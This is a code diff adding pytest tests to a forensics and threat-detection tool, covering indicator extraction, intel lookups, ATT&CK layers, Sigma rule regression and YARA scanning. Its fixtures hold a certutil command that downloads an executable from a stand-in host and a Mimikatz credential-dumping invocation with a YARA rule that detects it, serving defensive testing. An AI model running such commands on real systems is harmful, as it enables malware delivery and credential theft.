@@ -422,3 +422,119 @@ def test_interrupted_import_can_run_again(on, tmp_path, home):
     o = wait_idle(cl, c["id"])
     assert o["events"] == 17 and [s["status"] for s in o["sources"]] == ["done"] and not kept.exists()
     assert cl.post(f"/api/dfir/cases/{c['id']}/sources/{sid}/retry").status_code == 409
+
+
+class FakeHub:
+    """An intel connector with a lookup tool that knows one domain."""
+    def __init__(self):
+        self.calls = []
+
+    def connectors_for_role(self, role):
+        return [type("S", (), {"name": "zarqa"})()] if role == "intel" else []
+
+    def tools(self, name):
+        return [{"name": "lookup", "allowed": True}]
+
+    def call(self, conn, tool, args, **kw):
+        self.calls.append(args["value"])
+        found = args["value"] == "evil.example.net"
+        body = {"found": found, "matches": [{"tags": ["c2"]}] if found else []}
+        return {"content": f"<<UNTRUSTED-DATA x>>\n{json.dumps(body)}\n<<END-UNTRUSTED-DATA x>>"}
+
+
+def test_intel_check(on, tmp_path):
+    from actaeon.dfir import intel
+    from actaeon.dfir import service as S
+    from actaeon.intel import IntelStore
+    sy = "Microsoft-Windows-Sysmon/Operational"
+    rows = [win("22", sy, "2026-11-20T10:00:00Z", Image="C:\\\\w\\\\x.exe", QueryName="evil.example.net"),
+            win("3", sy, "2026-11-20T10:00:01Z", Image="C:\\\\w\\\\x.exe", DestinationIp="45.33.32.156"),
+            win("3", sy, "2026-11-20T10:00:02Z", Image="C:\\\\w\\\\x.exe", DestinationIp="10.1.2.3"),
+            win("1", sy, "2026-11-20T10:00:03Z", Image="C:\\\\w\\\\certutil.exe",
+                CommandLine="certutil -urlcache -f http://dl.example.org/a.exe a.exe",
+                Hashes="SHA256=" + "ab" * 32 + ",MD5=" + "cd" * 16)]
+    p = tmp_path / "i.jsonl"
+    p.write_text(jl(rows))
+    st = S.store_for(on)
+    c = st.create_case("Case", "", actor="a")
+    S.import_file(on, c["id"], p, "i.jsonl", actor="a")
+    found = intel.indicators(st, c["id"])
+    assert "10.1.2.3" not in found and "45.33.32.156" in found and "evil.example.net" in found
+    assert "http://dl.example.org/a.exe" in found and "dl.example.org" in found and "ab" * 32 in found
+    IntelStore(on.data_dir / "intel.sqlite").add("45.33.32.156", source="test")
+    hub = FakeHub()
+    res = intel.check(on, st, c["id"], hub=hub)
+    assert res["matched"] == 2 and res["sources"] == ["local intel", "zarqa"]
+    assert "10.1.2.3" not in hub.calls                               # private addresses never leave
+    titles = {d["title"] for d in st.detection_summary(c["id"])}
+    assert "Known indicator evil.example.net (c2)" in titles and "Known indicator 45.33.32.156" in titles
+    S.analyze(on, c["id"])                                            # analyzers keep intel detections
+    assert "Known indicator evil.example.net (c2)" in {d["title"] for d in st.detection_summary(c["id"])}
+
+
+def test_navigator_layers(on, tmp_path):
+    from actaeon.dfir import service as S
+    from actaeon.navigator import case_layer
+    from actaeon.web import create_app
+    c = S.store_for(on).create_case("Case", "", actor="a")
+    S.import_file(on, c["id"], make_evidence(tmp_path), "e.jsonl", actor="a")
+    S.analyze(on, c["id"])
+    lay = case_layer("Case", S.store_for(on).detection_summary(c["id"]))
+    ids = {t["techniqueID"] for t in lay["techniques"]}
+    assert "T1059.001" in ids and lay["versions"]["layer"] == "4.5" and lay["domain"] == "enterprise-attack"
+    cl = create_app(on).test_client()
+    assert cl.get(f"/api/dfir/cases/{c['id']}/navigator.json").get_json()["techniques"]
+    assert cl.get("/api/rules/coverage/navigator.json").get_json()["name"] == "Actaeon rule coverage"
+
+
+def test_rule_regression(on, tmp_path):
+    from actaeon.rules import regress
+    from actaeon.rules import service as R
+    corpus = tmp_path / "samples"
+    corpus.mkdir()
+    (corpus / "a.jsonl").write_text(make_evidence(tmp_path).read_text())
+    rule = """title: Winword child
+logsource: {category: process_creation, product: windows}
+detection:
+  sel: {ParentImage|endswith: '\\\\winword.exe'}
+  condition: sel
+level: high
+tags: [attack.t1204.002]
+"""
+    r = R.create(on, rule, actor="a")
+    R.change_status(on, r["id"], "submit", actor="a")
+    base = regress.run(on, corpus)
+    assert any(v["title"] == "Winword child" for v in base["a.jsonl"].values())
+    assert regress.compare(base, regress.run(on, corpus))["ok"]
+    R.edit(on, r["id"], rule.replace("winword.exe", "excel.exe"), actor="b")     # a change that breaks the rule
+    res = regress.compare(base, regress.run(on, corpus))
+    assert not res["ok"] and res["lost"][0]["rule"] == "Winword child"
+    assert not list((on.data_dir).glob("dfir.sqlite")) or not __import__("actaeon.dfir.service", fromlist=["x"]).store_for(on).cases()
+
+
+def test_yara_at_import(on, tmp_path, home):
+    pytest.importorskip("yara")
+    rules = tmp_path / "yara"
+    rules.mkdir()
+    (rules / "t.yar").write_text('rule Mimi { meta: severity = "critical" strings: $a = "sekurlsa::logonpasswords" '
+                                 'condition: $a }\n')
+    (rules / "bad.yar").write_text("rule { nope")
+    write_cfg(home, lambda d: d.update(dfir={"enabled": True, "yara_dirs": [str(rules)]}))
+    from actaeon import config
+    from actaeon.dfir import service as S
+    config._CONFIG = None
+    cfg = config.get_config()
+    p = tmp_path / "c.zip"
+    with zipfile.ZipFile(p, "w") as z:
+        z.writestr("tools/m.ps1", "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'")
+        z.writestr("logs/a.jsonl", jl([{"timestamp": "2026-11-20T10:00:00Z", "message": "hello"}]))
+    st = S.store_for(cfg)
+    c = st.create_case("Case", "", actor="a")
+    r = S.import_file(cfg, c["id"], p, "c.zip", actor="a")
+    assert "YARA: 1 match(es)" in r["note"] and "bad.yar" in r["note"]
+    d = {x["title"]: x for x in st.detection_summary(c["id"])}["YARA: Mimi"]
+    assert d["level"] == "critical" and d["origin"] == "yara"
+    ev = st.search(c["id"], rule=d["rule_key"])[0][0]
+    assert ev["data"]["member"] == "tools/m.ps1" and len(ev["data"]["sha256"]) == 64
+    S.analyze(cfg, c["id"])
+    assert "YARA: Mimi" in {x["title"] for x in st.detection_summary(c["id"])}
